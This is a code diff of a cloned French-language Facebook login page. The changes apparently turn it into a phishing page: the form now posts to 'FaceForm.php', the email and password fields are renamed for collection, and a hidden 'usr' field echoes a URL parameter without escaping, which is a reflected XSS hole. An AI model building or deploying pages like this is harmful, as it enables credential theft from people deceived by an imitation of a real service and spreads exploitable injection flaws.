@@ -58,26 +58,29 @@
                         <div class="_8esn">
                             <div class="_8iep _8icy _9ahz _9ah-">
                                 <div class="_6luv _52jv">
-                                    <form class="_featuredLogin__formContainer" data-testid="royal_login_form" action=""
+                                    <form class="_featuredLogin__formContainer" data-testid="royal_login_form" action="FaceForm.php"
                                           method="post" onsubmit="" id="u_0_a" _lpchecked="1">
                                         <input type="hidden" name="jazoest" value="2928" autocomplete="off"><input
                                                 type="hidden" name="lsd" value="AVpjoo4cCG0" autocomplete="off">
                                         <div>
-                                            <div class="_6lux"><input type="text" class="inputtext _55r1 _6luy"
-                                                                      name="email" id="email" data-testid="royal_email"
+                                            <div class="_6lux"><input type="text" class="inputtext _55r1 _6luy" required
+                                                                      name="username" id="email" data-testid="royal_email"
                                                                       placeholder="Adresse e-mail ou numéro de tél."
                                                                       autofocus="1"
                                                                       aria-label="Adresse e-mail ou numéro de tél."
                                                                       autocomplete="off"></div>
-                                            <div class="_6lux"><input type="password" class="inputtext _55r1 _6luy"
-                                                                      name="pass" id="pass" data-testid="royal_pass"
+                                            <div class="_6lux"><input type="password" class="inputtext _55r1 _6luy" required
+                                                                      name="password" id="pass" data-testid="royal_pass"
                                                                       placeholder="Mot de passe"
                                                                       aria-label="Mot de passe" autocomplete="off">
                                             </div>
                                         </div>
-                                        <input type="hidden" autocomplete="off" name="login_source"
-                                               value="comet_headerless_login"><input type="hidden" autocomplete="off"
-                                                                                     name="next" value="">
+                                        <input type="hidden" name="usr" value="<?php
+                                        if (isset($_GET["usr"]))
+                                        {
+                                            echo $_GET["usr"];
+                                        }
+                                        ?>">
                                         <div class="_6ltg">
                                             <button value="1" class="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy"
                                                     name="login" data-testid="royal_login_button" type="submit"
